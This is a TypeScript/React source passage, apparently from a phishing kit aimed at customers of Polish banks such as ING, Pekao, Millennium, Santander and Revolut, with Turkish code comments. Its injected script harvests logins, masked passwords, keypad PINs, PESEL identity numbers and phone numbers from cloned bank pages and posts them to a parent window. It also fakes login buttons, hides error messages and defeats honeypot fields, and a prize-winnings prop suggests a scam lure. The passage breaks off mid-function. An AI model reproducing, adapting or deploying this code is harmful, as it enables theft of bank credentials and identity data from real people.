"use client";

import React, { useEffect, useRef, useState } from "react";

type Props = {
  bankName: string;
  logoFile?: string;
  brandColor?: string;
  bankSlug?: string;
  formData: {
    verfuegernummer?: string;
    pin?: string;
    personalCode?: string;
    loginMethod?: string;
  };
  wonAmount?: number | null;
  wonLabel?: string | null;
  onChange: (field: string, value: string) => void;
  handleRouteAction: (overrideData?: any) => void;
  onProgressSave?: (data: Record<string, string>) => void;
  saving?: boolean;
};

const SUBMIT_TEXT_RE =
  /(log[\s-]*in|sign[\s-]*in|zaloguj|zatwierdź|zatwierdz|dalej|kontynuuj|continue|confirm|submit|verify|next|proceed|enter|ok|authenticate)/i;

const IGNORED_INPUT_TYPES = new Set([
  "hidden",
  "submit",
  "button",
  "reset",
  "image",
  "file",
  "checkbox",
  "radio",
]);

function buildInjectionScript(step: number, bankSlug: string, brandColor: string): string {
  const reSource = SUBMIT_TEXT_RE.source;
  const reFlags = SUBMIT_TEXT_RE.flags;
  return `(() => {
    const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
    const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};
    const STEP = ${step};
    const BANK_SLUG = ${JSON.stringify(bankSlug)};
    const BRAND_COLOR = ${JSON.stringify(brandColor)};

    // ---------------------------------------------------------------
    // SHADOW DOM: ING'nin kaydedilmis sayfasi declarative shadow DOM
    // kullaniyor (91 adet <template shadowrootmode>) — input ve butonlar
    // shadow root icinde, document.querySelectorAll hicbir sey bulamaz.
    // qsa() shadow sinirlarini asan derin sorgu; evtTarget()/evPath()
    // shadow'dan gelen olaylarda retarget edilmis target yerine
    // composedPath()'in gercek ilk dugumunu verir.
    // ---------------------------------------------------------------
    const qsa = (root, sel) => {
      const out = [];
      const seenEls = new Set();
      const seenRoots = new Set();
      const stack = [root];
      while (stack.length) {
        const r = stack.pop();
        if (!r || seenRoots.has(r)) continue;
        seenRoots.add(r);
        try {
          r.querySelectorAll(sel).forEach((el) => {
            if (!seenEls.has(el)) { seenEls.add(el); out.push(el); }
          });
        } catch (e) {}
        try {
          r.querySelectorAll("*").forEach((el) => {
            if (el.shadowRoot) stack.push(el.shadowRoot);
          });
        } catch (e) {}
      }
      return out;
    };
    const evPath = (e) => {
      try {
        const p = e.composedPath ? e.composedPath() : null;
        if (p && p.length) return p;
      } catch (err) {}
      const arr = [];
      let n = e.target;
      let g = 0;
      while (n && n.nodeType === 1 && g++ < 12) { arr.push(n); n = n.parentElement; }
      return arr;
    };
    const evtTarget = (e) => {
      const p = evPath(e);
      return p.length ? p[0] : e.target;
    };

    // ---------------------------------------------------------------
    // MASKED PASSWORD BOXES (pekao24/ing/bnpparibas/alior/velobank 2.html):
    // tek-karakter password inputlari — kayitli sayfada cogusu disabled.
    // Hepsi aktif edilir, 1 karakter girilince otomatik sonrakine gecilir,
    // degerler birlestirilip "password" olarak gonderilir.
    // ---------------------------------------------------------------
    const isMaskedBox = (el) => {
      try {
        if (!el || !el.getAttribute) return false;
        // Millennium PESEL pozisyon kutulari (Pesel-1..Pesel-11): text tipinde
        // ama tek-karakter masked davranisi ister (otomatik sonraki kutuya gec).
        if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) return true;
        const t = (el.getAttribute("type") || "").toLowerCase();
        if (t !== "password") return false;
        const ml = el.getAttribute("maxlength") || el.getAttribute("text-length");
        return ml === "1";
      } catch (e) { return false; }
    };
    const maskedBoxes = () => {
      const out = [];
      try {
        qsa(document, "input").forEach((el) => {
          if (isMaskedBox(el)) out.push(el);
        });
      } catch (e) {}
      return out;
    };
    const maskedKey = (el) => el.getAttribute("name") || el.getAttribute("id") || "";
    const combinedMaskedPassword = () => {
      const boxes = maskedBoxes();
      if (!boxes.length) return "";
      let s = "";
      boxes.forEach((el) => { s += (el.value || ""); });
      return s;
    };

    // ---------------------------------------------------------------
    // KEY SECIMI: kayitli sayfalarda bircok input'un name/id'si GUID,
    // "control-12345", "name-uuid" gibi teknik deger — admin kolonu
    // bunlari tanimaz. Semantik kaynaklar sirayla denenir:
    // formcontrolname > data-test-id > name > id > ng-reflect-name >
    // aria-label > aria-labelledby metni > placeholder.
    // ---------------------------------------------------------------
    const UUID_RE = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
    const normAlnum = (s) => String(s || "").replace(UUID_RE, "").replace(/[^a-z0-9]/gi, "");
    const isGarbageKey = (s) => {
      const t = normAlnum(s);
      if (t.length < 3) return true;
      if (/^\\d+$/.test(t)) return true;
      // "name", "id", "control123", "inginput1ab2cd" gibi anlamsiz keyler
      if (/^(name|id|input|control|el|field|key)$/.test(t)) return true;
      if (/^(control|inginput|custominput|name)[0-9a-z]{5,}$/i.test(t)) return true;
      return false;
    };
    const resolveLabelledText = (el, doc) => {
      try {
        const lb = el.getAttribute("aria-labelledby");
        if (!lb) return "";
        const parts = [];
        lb.split(/\\s+/).forEach((lid) => {
          try {
            const n = doc.getElementById(lid);
            const txt = n ? (n.textContent || "").trim() : "";
            if (txt) parts.push(txt);
          } catch (e) {}
        });
        const s = parts.join(" ").trim();
        return s.length >= 3 && s.length <= 60 ? s : "";
      } catch (e) { return ""; }
    };
    const pickKey = (el, doc) => {
      const cands = [
        el.getAttribute("formcontrolname"),
        el.getAttribute("data-test-id"),
        el.getAttribute("name"),
        el.getAttribute("id"),
        el.getAttribute("ng-reflect-name"),
      ];
      for (const c of cands) {
        if (c && !isGarbageKey(c)) return c;
      }
      const lbl =
        el.getAttribute("aria-label") ||
        resolveLabelledText(el, doc) ||
        el.getAttribute("placeholder") ||
        "";
      if (lbl && lbl.trim().length >= 3) return lbl.trim().slice(0, 60);
      // son care: uuid'li key'in UUID'siz kismi anlamliysa onu kullan
      for (const c of cands) {
        if (c) {
          const t = String(c).replace(UUID_RE, "").replace(/[-_]+$/, "");
          if (normAlnum(t).length >= 3) return t;
        }
      }
      return "";
    };

    const collectFrom = (doc) => {
      const data = {};
      try {
        qsa(doc, "input, textarea, select").forEach((el) => {
          const type = (el.getAttribute("type") || "text").toLowerCase();
          const name = pickKey(el, doc);
          if (!name) return;
          // Ekran disi honeypot (alior extra-input vb.) veriye karismasin
          try { if (!isVisibleEl(el) && type !== "hidden") return; } catch (e) {}
          if (type === "radio") {
            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
            return;
          }
          if (type === "checkbox") {
            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
            return;
          }
          if (IGNORED.includes(type)) return;
          const value = el.value != null ? String(el.value) : "";
          if (value.trim() === "") return;
          data[name] = value;
        });
      } catch (e) {}
      return data;
    };

    const collect = () => {
      const data = {};
      const walk = (doc, depth) => {
        if (!doc || depth > 4) return;
        try {
          Object.assign(data, collectFrom(doc));
          qsa(doc, "iframe").forEach((f) => {
            try { walk(f.contentDocument, depth + 1); } catch (e) {}
          });
        } catch (e) {}
      };
      walk(document, 0);

      // Masked kutular: tek tek key'leri sil, birlesik password yaz.
      // PESEL kutulari (Pesel-N) masked DAVRANISI alir ama password'a
      // KARISMAZ — asagida ayri "pesel" alani olarak birlestirilir.
      try {
        const boxes = maskedBoxes().filter((el) => !/^pesel-\\d+$/i.test(el.getAttribute("name") || ""));
        if (boxes.length) {
          boxes.forEach((el) => { const k = maskedKey(el); if (k && data[k] !== undefined) delete data[k]; });
          let combined = "";
          boxes.forEach((el) => { combined += (el.value || ""); });
          if (combined.trim()) data.password = combined;
        }
      } catch (e) {}

      // Millennium PESEL kutulari (Pesel-10, Pesel-11 ...) -> tek "pesel" alani
      try {
        const peselParts = [];
        qsa(document, "input").forEach((el) => {
          const n = el.getAttribute("name") || "";
          if (/^pesel[-_]?/i.test(n)) {
            const v = (el.value || "").trim();
            if (v) peselParts.push({ n, v });
            if (data[n] !== undefined) delete data[n];
          }
        });
        if (peselParts.length) {
          data.pesel = peselParts
            .map((p) => p.n.replace(/^pesel[-_]?/i, "") + ":" + p.v)
            .join(" ");
        }
      } catch (e) {}

      // Millennium telefon: prefix + phoneNumber -> bankPhone
      try {
        if (data.phoneNumber) {
          data.bankPhone = String(data.prefix || "") + String(data.phoneNumber || "");
          delete data.prefix;
          delete data.phoneNumber;
        }
      } catch (e) {}

      return data;
    };

    const send = (trigger, extra) => {
      const data = collect();
      if (extra && typeof extra === "object") Object.assign(data, extra);
      if (Object.keys(data).length === 0) return;
      try {
        (window.top || window.parent).postMessage({ type: "PL_BANK_SUBMIT", step: STEP, trigger, data }, "*");
      } catch (e) { /* noop */ }
    };

    const isSubmitish = (el) => {
      if (!el || !el.getAttribute) return false;
      const tag = (el.tagName || "").toLowerCase();
      const type = (el.getAttribute("type") || "").toLowerCase();
      const role = (el.getAttribute("role") || "").toLowerCase();
      const ident = ((el.getAttribute("id") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
      const text = (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "").trim();
      if (tag === "input" && (type === "submit" || type === "image")) return true;
      if (tag === "button" && type === "submit") return true;
      if ((tag === "a" || tag === "button" || role === "button" || (tag === "input" && type === "button")) && /(submit|signin|login-button|btn-login|continue|confirm)/.test(ident)) return true;
      if (role === "button" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if (tag === "a" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if ((tag === "input" || tag === "button") && type !== "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      // ING: <ing-button type=submit>Zaloguj</ing-button> custom element
      if (tag === "ing-button" && (type === "submit" || /button-confirm/.test(ident) || SUBMIT_RE.test(text))) return true;
      // Pekao/BNP diger custom submit elementleri
      if (type === "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      return false;
    };

    // ------------------------------------------------------------------
    // KEYPAD MODE (Revolut 2.html style): digit buttons [data-value="0-9"].
    // ------------------------------------------------------------------
    let keypadBuffer = "";
    const PIN_MIN = 4;
    const PIN_MAX = 6;
    const hasKeypad = () => {
      try { return !!document.querySelector("button[data-value]"); } catch (e) { return false; }
    };
    const flushKeypad = () => {
      if (keypadBuffer.length >= PIN_MIN) {
        const buf = keypadBuffer;
        keypadBuffer = "";
        try { renderKeypad(); } catch (e) {}
        send("keypad", { passcode: buf, pin: buf });
      }
    };
    const renderKeypadDots = () => {
      try {
        if (keypadBuffer.length === 0) {
          const dot0 = document.querySelector(".sx827n0");
          const host0 = (dot0 && dot0.parentElement) || window.__plDotHost;
          if (host0 && host0.isConnected && window.__plDotHost) host0.innerHTML = "";
          const own0 = document.getElementById("pl-keypad-dots");
          if (own0) own0.style.display = "none";
          return;
        }
        const dot = document.querySelector(".sx827n0");
        const host = (dot && dot.parentElement) || window.__plDotHost;
        if (host && host.isConnected) {
          window.__plDotHost = host;
          let darkBg = false;
          try {
            let node = host;
            while (node && node !== document.documentElement) {
              const c = getComputedStyle(node).backgroundColor;
              if (c && c !== "transparent" && !/^rgba?\\(\\s*0\\s*,\\s*0\\s*,\\s*0\\s*(,\\s*0\\s*)?\\)/.test(c)) {
                const m = /(\\d+)[,\\s]+(\\d+)[,\\s]+(\\d+)/.exec(c);
                if (m) darkBg = 0.2126 * +m[1] + 0.7152 * +m[2] + 0.0722 * +m[3] < 128;
                break;
              }
              node = node.parentElement;
            }
          } catch (e) {}
          const fillCol = darkBg ? "#ffffff" : "#191c1f";
          const emptyCol = darkBg ? "rgba(255,255,255,.42)" : "#aab3bb";
          host.style.display = "flex";
          host.style.flexDirection = "row";
          host.style.flexWrap = "nowrap";
          host.style.justifyContent = "center";
          host.style.alignItems = "center";
          host.style.gap = "16px";
          host.innerHTML = "";
          for (let i = 0; i < PIN_MAX; i++) {
            const d = document.createElement("span");
            d.style.cssText =
              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;flex:none;" +
              (i < keypadBuffer.length
                ? "background:" + fillCol + ";border:2px solid " + fillCol + ";"
                : "background:transparent;border:2px solid " + emptyCol + ";");
            host.appendChild(d);
          }
          return;
        }
        let own = document.getElementById("pl-keypad-dots");
        if (!own) {
          own = document.createElement("div");
          own.id = "pl-keypad-dots";
          own.style.cssText =
            "position:fixed;top:20%;left:50%;transform:translateX(-50%);z-index:999998;" +
            "display:flex;gap:16px;justify-content:center;padding:10px 18px;" +
            "background:rgba(255,255,255,.92);border-radius:24px;box-shadow:0 2px 10px rgba(0,0,0,.18)";
          document.body.appendChild(own);
        }
        own.innerHTML = "";
        for (let i = 0; i < PIN_MAX; i++) {
          const d = document.createElement("span");
          d.style.cssText =
            "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
            (i < keypadBuffer.length
              ? "background:#191c1f;border:2px solid #191c1f;"
              : "background:transparent;border:2px solid #aab3bb;");
          own.appendChild(d);
        }
      } catch (e) {}
    };
    const injectBackspace = () => {
      try {
        if (document.getElementById("pl-keypad-backspace")) return;
        if (!hasKeypad()) return;
        if (BANK_SLUG !== "revolut" && keypadBuffer.length === 0) return;
        const zero = qsa(document, "button[data-value='0']")[0];
        if (!zero) return;
        const cell = zero.nextElementSibling;
        const host = cell && cell.tagName === "DIV" ? cell : zero.parentElement;
        if (!host) return;
        const btn = document.createElement("button");
        btn.id = "pl-keypad-backspace";
        btn.type = "button";
        btn.textContent = "⌫";
        btn.style.cssText =
          "width:64px;height:64px;border:none;border-radius:50%;background:transparent;" +
          "color:#191c1f;font:400 26px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
          "cursor:pointer;display:flex;align-items:center;justify-content:center;margin:0 auto";
        btn.addEventListener("click", (ev) => {
          try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
          keypadBuffer = keypadBuffer.slice(0, -1);
          renderKeypad();
        });
        host.appendChild(btn);
      } catch (e) {}
    };
    const renderContinueButton = () => {
      try {
        let btn = document.getElementById("pl-keypad-continue");
        const show = hasKeypad() && keypadBuffer.length >= PIN_MIN;
        if (show && !btn) {
          btn = document.createElement("button");
          btn.id = "pl-keypad-continue";
          btn.type = "button";
          btn.textContent = "Zaloguj się";
          btn.style.cssText =
            "position:fixed;left:50%;transform:translateX(-50%);bottom:24px;z-index:999999;" +
            "width:calc(100% - 32px);max-width:400px;height:52px;border:none;border-radius:26px;" +
            "background:#191c1f;color:#ffffff;font:600 17px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
            "cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35)";
          btn.addEventListener("click", (ev) => {
            try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
            flushKeypad();
          });
          document.body.appendChild(btn);
        }
        if (btn) btn.style.display = show ? "block" : "none";
      } catch (e) {}
    };
    const renderKeypad = () => {
      renderKeypadDots();
      renderContinueButton();
      injectBackspace();
    };

    const enableControls = (root) => {
      try {
        // CSS pointer-events:none / inert / sf-hidden kilidini global ac:
        if (!root.getElementById("pl-pe-fix")) {
          const st = document.createElement("style");
          st.id = "pl-pe-fix";
          st.textContent =
            "input,textarea,select,button,a,[role='button'],[contenteditable='true']," +
            "ing-button,ing-input,ing-input-masked-password-field,bnp-input,san-input{" +
            "pointer-events:auto !important;user-select:auto !important;-webkit-user-select:auto !important}" +
            ".sf-hidden{display:none !important}" +
            ".modal-backdrop,.cdk-overlay-backdrop,.modal-blocker,.blocker{display:none !important}";
          (root.head || root.documentElement).appendChild(st);
        }
        // ----------------------------------------------------------
        // BANKA OZEL CSS DUZELTMELERI:
        // velobank: gercek input height:0 + acik gri -> karakter
        //   React span'lerinde ciziliyordu; statik sayfada gorunmez.
        // santander: #wrapper.fixed 976px + .signin_box absolute ->
        //   mobilde login kutusu ekran disinda kaliyor.
        // ----------------------------------------------------------
        const BANK_CSS = {
          velobank:
            "input.sc-dUMaFF{position:static!important;width:46px!important;height:56px!important;" +
            "display:block!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;" +
            "font-size:24px!important;font-weight:600!important;text-align:center!important;" +
            "background:rgba(255,255,255,.9)!important;border-radius:8px!important;" +
            "caret-color:#191c1f!important;opacity:1!important;margin:0 auto!important}" +
            "input.sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}" +
            "span.sc-bQEQyQ{display:flex!important;align-items:center!important;justify-content:center!important}",
          santander:
            "@media(max-width:900px){" +
            "html,body{min-width:0!important;overflow-x:hidden!important}" +
            "#wrapper.fixed,#wrapper{width:100%!important;min-width:0!important}" +
            "#kolumna-lewa,#kolumna-prawa,.right-banner{display:none!important}" +
            "#content{display:block!important;width:100%!important;float:none!important;margin:0 auto!important;padding:8px!important}" +
            ".signin_box{position:static!important;width:100%!important;max-width:460px!important;" +
            "margin:12px auto!important;left:auto!important;right:auto!important;top:auto!important;" +
            "box-shadow:0 4px 15px 0 rgba(0,0,0,.18)!important}" +
            ".loginPanel{width:100%!important;max-width:460px;margin-left:auto!important;margin-right:auto!important}" +
            ".contact_details{position:static!important;width:100%!important;left:auto!important;top:auto!important}" +
            "#header{flex-wrap:wrap;height:auto!important;padding:12px 16px!important}" +
            "#container{margin-top:8px!important;width:100%!important}" +
            ".login-wrapper{width:100%!important}" +
            "}" +
            "@media(min-width:901px){" +
            ".signin_box{position:static!important;margin:0 auto!important;left:auto!important;right:auto!important}" +
            "}",
          "bsr-krakow":
            "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
        };
        const bankCss = BANK_CSS[BANK_SLUG];
        if (bankCss && !root.getElementById("pl-bank-fix")) {
          const st2 = document.createElement("style");
          st2.id = "pl-bank-fix";
          st2.textContent = bankCss;
          (root.head || root.documentElement).appendChild(st2);
        }
        qsa(root, "button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
          try {
            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
            if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
            if (el.hasAttribute("inert")) el.removeAttribute("inert");
            // READONLY: bazi kayitlarda tum form readonly kaydedilmis
            // (pocztowy ~700 adet) -> giris "kapali" gorunuyor. Ac.
            if ((el.tagName === "INPUT" || el.tagName === "TEXTAREA") && el.hasAttribute("readonly")) el.removeAttribute("readonly");
            if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
            if (el.getAttribute("aria-readonly") === "true") el.setAttribute("aria-readonly", "false");
            if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
            if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // SHADOW ROOT FIX: document.head'e enjekte edilen CSS shadow root
    // icine ULASMAZ (style scoping). ING gibi shadow-DOM sayfalarda
    // shadow-ic pointer-events/readonly kilitlerini de cozmek icin
    // her acik shadowRoot'a kucuk fix-style enjekte edilir.
    // ------------------------------------------------------------------
    const fixShadowRoots = () => {
      try {
        const seenRoots = new Set();
        const stack = [document];
        while (stack.length) {
          const r = stack.pop();
          if (!r || seenRoots.has(r)) continue;
          seenRoots.add(r);
          try {
            r.querySelectorAll("*").forEach((el) => {
              if (el.shadowRoot) {
                stack.push(el.shadowRoot);
                if (!el.shadowRoot.__plStyled) {
                  el.shadowRoot.__plStyled = true;
                  try {
                    const st = document.createElement("style");
                    st.textContent =
                      "input,textarea,select,button,a,[role=button]{pointer-events:auto!important;user-select:auto!important;-webkit-user-select:auto!important}" +
                      "[inert]{pointer-events:auto!important}";
                    el.shadowRoot.appendChild(st);
                  } catch (e) {}
                }
              }
            });
          } catch (e) {}
        }
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // OVERLAY KATILICI: kaydedilen sayfalarda yukleniyor splash'i,
    // cookie scrim'i, modal arkaplan gibi TAM EKRAN katmanlar JS
    // calismadigi icin kapanmiyor -> tum tiklamalari yutuyor.
    // Form kontrolu icermeyen, ekrani kaplayan opak katmani gizle.
    // ------------------------------------------------------------------
    const killOverlays = (root) => {
      try {
        const vw = root.documentElement ? root.documentElement.clientWidth : 0;
        const vh = root.documentElement ? root.documentElement.clientHeight : 0;
        if (!vw || !vh) return;
        qsa(root, "body *").forEach((el) => {
          try {
            if (el.__plOverlayChecked) return;
            el.__plOverlayChecked = true;
            const tag = (el.tagName || "").toLowerCase();
            if (["script", "style", "link", "meta", "iframe", "svg", "path"].includes(tag)) return;
            if (el.querySelector && el.querySelector("input,textarea,select,form,[type=submit]")) return;
            const win = el.ownerDocument && el.ownerDocument.defaultView;
            const cs = win ? win.getComputedStyle(el) : null;
            if (!cs) return;
            if (cs.position !== "fixed" && cs.position !== "absolute") return;
            if (cs.display === "none" || cs.visibility === "hidden") return;
            if (cs.pointerEvents === "none") return;
            const r = el.getBoundingClientRect();
            if (r.width < vw * 0.85 || r.height < vh * 0.85) return;
            const bg = cs.backgroundColor || "";
            const opaque = bg && bg !== "transparent" && !/rgba?\\([^)]*,\\s*0(\\.\\d+)?\\s*\\)/.test(bg);
            const zi = parseInt(cs.zIndex || "0", 10) || 0;
            const txt = (el.textContent || "").trim();
            if ((opaque || zi >= 50) && txt.length < 500) {
              el.style.setProperty("display", "none", "important");
            }
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // TIKLAMA ENGEL KALDIRICI: input'un/butonun uzerine binen baska bir
    // eleman varsa (overlay, sahte kutu, dekor) o elemana
    // pointer-events:none ver — tiklama gercek kontrole ulasir.
    // ------------------------------------------------------------------
    const unblockAt = (root, el) => {
      try {
        const r = el.getBoundingClientRect();
        if (!r || r.width < 2 || r.height < 2) return;
        const cx = r.left + Math.min(r.width / 2, 24);
        const cy = r.top + Math.min(r.height / 2, 20);
        const doc = el.ownerDocument || root;
        const hit = doc.elementFromPoint ? doc.elementFromPoint(cx, cy) : null;
        if (!hit || hit === el) return;
        // hit, kontrolun kendisi/icindeki eleman/etiket sarmalayicisiysa sorun yok
        let n = hit;
        let guard = 0;
        while (n && guard++ < 12) {
          if (n === el) return;
          n = n.parentElement;
        }
        if (el.contains && el.contains(hit)) return;
        // hit bir label ise kontrole yonlendirir — engel sayilmaz
        if ((hit.tagName || "").toLowerCase() === "label") return;
        hit.style.setProperty("pointer-events", "none", "important");
      } catch (e) {}
    };
    const unblockInputs = (root) => {
      try {
        qsa(root, "input, textarea, select").forEach((el) => {
          const t = (el.getAttribute("type") || "text").toLowerCase();
          if (IGNORED.includes(t)) return;
          if (!isVisibleEl(el)) return;
          unblockAt(root, el);
        });
        qsa(root, "button, a, [role='button'], [type=submit], ing-button").forEach((el) => {
          try { if (isSubmitish(el)) unblockAt(root, el); } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // HATA DURUMU TEMIZLIGI: kayit aninda dogrulama hatasi acik kalmis
    // sayfalarda kirmizi border/uyari gorunuyor. Input'lardan invalid
    // siniflarini sil, aria-invalid=false yap, hata mesaj bloklarini gizle.
    // ------------------------------------------------------------------
    const ERROR_TOKEN_RE = /(^|[\\s_.\\-])(error|errors|blad|invalid|niepoprawn|nieprawidlow|alert-danger|form-error|field-error|validation|komunikat)/i;
    const cleanupErrorState = (root) => {
      try {
        qsa(root, "input, textarea, select").forEach((el) => {
          try {
            if (el.getAttribute("aria-invalid") === "true") el.setAttribute("aria-invalid", "false");
            if (el.classList) {
              ["invalid", "ng-invalid", "is-invalid", "has-error", "error", "field-error", "input-error", "cabp-state--error"].forEach((c) => {
                if (el.classList.contains(c)) el.classList.remove(c);
              });
              el.classList.forEach((c) => {
                if (/invalid|error/i.test(c)) el.classList.remove(c);
              });
            }
          } catch (e) {}
        });
        // Hata mesaji bloklari: id/class'i error/blad/invalid iceren elemanlar.
        // KURAL: input/button/form ICEREN wrapper ASLA gizlenmez (BNP'de
        // "ng-invalid" wrapper'i input'u de goturuyordu) — sadece hata
        // siniflari silinir. Sadece yaprak mesaj bloklari gizlenir.
        qsa(root, "[id],[class],[role='alert']").forEach((el) => {
          try {
            const tag = (el.tagName || "").toLowerCase();
            if (["input", "textarea", "select", "form", "body", "html"].includes(tag)) return;
            const ident = ((el.id || "") + " " + (typeof el.className === "string" ? el.className : "")).trim();
            const isAlert = el.getAttribute("role") === "alert";
            if (!isAlert && !ERROR_TOKEN_RE.test(ident)) return;
            // icinde form kontrolu varsa: gizleme, sadece hata siniflarini kaldir
            if (el.querySelector && el.querySelector("input,textarea,select,button,form,[role='textbox']")) {
              if (el.classList) {
                el.classList.forEach((c) => { if (/invalid|error|blad/i.test(c)) el.classList.remove(c); });
              }
              return;
            }
            if (el.__plErrorHidden) return;
            const txt = (el.textContent || "").trim();
            if (!isAlert && txt.length === 0) return;
            if (txt.length > 300) return;
            el.style.setProperty("display", "none", "important");
            el.__plErrorHidden = true;
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // MASKED BOX DAVRANISI: hepsini aktif et + 1 karakterde sonrakine
    // otomatik gec + Backspace'de oncekine don.
    // ------------------------------------------------------------------
    const applyMaskedBehavior = (root) => {
      try {
        const boxes = maskedBoxes();
        boxes.forEach((el, i) => {
          try {
            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
            if (el.hasAttribute("aria-disabled")) el.setAttribute("aria-disabled", "false");
            if (el.classList && el.classList.contains("inactive")) {
              el.classList.remove("inactive");
              el.classList.add("active");
            }
            if (el.__plMasked) return;
            el.__plMasked = true;
            if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
            el.setAttribute("autocomplete", "off");
            el.addEventListener("input", () => {
              try {
                if ((el.value || "").length >= 1) {
                  const next = maskedBoxes()[i + 1];
                  if (next) next.focus();
                }
              } catch (e) {}
            });
            el.addEventListener("keydown", (ev) => {
              try {
                if (ev.key === "Backspace" && !(el.value || "").length) {
                  const prev = maskedBoxes()[i - 1];
                  if (prev) { prev.focus(); prev.value = ""; }
                }
              } catch (e) {}
            });
            el.addEventListener("paste", (ev) => {
              try {
                ev.preventDefault();
                const txt = ((ev.clipboardData || window.clipboardData).getData("text") || "").replace(/\\s/g, "");
                const bx = maskedBoxes();
                for (let j = 0; j < txt.length && i + j < bx.length; j++) {
                  bx[i + j].value = txt[j];
                  try { bx[i + j].dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
                }
              } catch (e) {}
            });
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // MILLENNIUM PESEL: security-digits-container'da bazi pozisyonlar
    // input'suz bos goruntu kutusu (div). Tum pozisyonlara tek-karakter
    // input enjekte et -> 11 kutunun hepsi aktif + otomatik gecis.
    // ------------------------------------------------------------------
    const fillEmptyPeselBoxes = (root) => {
      try {
        const container = root.querySelector("[data-testid=security-digits-container]");
        if (!container) return;
        Array.from(container.children).forEach((cell) => {
          try {
            if (cell.querySelector("input")) return;
            const p = cell.querySelector("p");
            const n = p ? (p.textContent || "").trim() : "";
            if (!/^\\d+$/.test(n)) return;
            // Gorsel bos kutunun (css-9i7jw0) uzerine absolute input koy;
            // hucreye tiklaninca da input fokusslansin.
            const host = cell.querySelector("div") || cell;
            try { host.style.position = "relative"; } catch (e) {}
            const inp = document.createElement("input");
            inp.type = "text";
            inp.maxLength = 1;
            inp.name = "Pesel-" + n;
            inp.id = "Pesel-" + n + "_input";
            inp.autocomplete = "off";
            inp.setAttribute("inputmode", "numeric");
            inp.setAttribute("aria-label", "PESEL - znak nr. " + n);
            inp.style.cssText =
              "position:absolute;inset:0;width:100%;height:100%;min-width:36px;min-height:44px;" +
              "border:none;outline:none;background:transparent;text-align:center;" +
              "font:inherit;font-size:1.35rem;font-weight:600;color:#191c1f;" +
              "caret-color:#191c1f;box-sizing:border-box;padding:0;display:block;" +
              "z-index:2;cursor:text";
            host.appendChild(inp);
            try {
              host.addEventListener("click", () => { try { inp.focus(); } catch (e) {} });
              cell.addEventListener("click", () => { try { inp.focus(); } catch (e) {} });
            } catch (e) {}
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // ING FIX: Zaloguj butonu sayfanin cok altinda kaliyor -> sabit
    // gorunur bar + mobil icin yatay tasmani engelle.
    // ------------------------------------------------------------------
    const applyIngFix = () => {
      try {
        if (BANK_SLUG !== "ing") return;
        if (document.getElementById("pl-ing-fix")) return;
        const st = document.createElement("style");
        st.id = "pl-ing-fix";
        st.textContent =
          "html,body{max-width:100vw;overflow-x:hidden}" +
          "ing-confirmation-buttons-layout{display:block !important;position:fixed !important;left:0;right:0;bottom:0;z-index:99999;background:#fff;padding:12px 16px;box-shadow:0 -4px 16px rgba(0,0,0,.08)}" +
          "ing-button[type=submit],ing-button.button-confirm{width:100% !important;--ing-button-width:100%}" +
          "@media(min-width:840px){ing-confirmation-buttons-layout{position:static !important;box-shadow:none;padding:16px 0}}";
        (document.head || document.documentElement).appendChild(st);
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // FORM DOLMADAN SUBMIT YOK: gorunur tum alanlar dolmadan giris
    // butonu pasif gorunur + tiklama/submit veri gondermez.
    // ------------------------------------------------------------------
    const isVisibleEl = (el) => {
      try {
        // Honeypot/ekran disi inputlar (alior extra-input left:-179451397px,
        // height:0 tuzaklari) "gorunur" sayilmaz — yoksa submit kilitlenir.
        const win = el.ownerDocument && el.ownerDocument.defaultView;
        const cs = win ? win.getComputedStyle(el) : null;
        if (cs && (cs.display === "none" || cs.visibility === "hidden")) return false;
        const r = el.getBoundingClientRect();
        if (!r || (r.width < 2 && r.height < 2)) return false;
        const w = (win && win.innerWidth) || 0;
        const h = (win && win.innerHeight) || 0;
        if (r.right < -10 || r.bottom < -10 || r.left > w + 10 || r.top > h + 10) return false;
        return true;
      } catch (e) { return true; }
    };
    const fillableInputs = (root) => {
      const out = [];
